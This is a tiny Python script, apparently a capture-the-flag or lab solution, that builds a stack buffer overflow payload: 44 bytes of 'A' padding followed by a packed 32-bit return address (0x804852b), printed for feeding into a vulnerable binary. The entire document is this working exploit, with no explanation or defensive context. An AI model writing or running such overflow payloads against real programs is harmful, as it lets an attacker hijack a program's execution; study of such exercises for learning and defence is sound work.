import struct

def pack(p):
    return struct.pack('<I', p)

payload = b'A'*44
payload += pack(0x804852b)

print(payload)
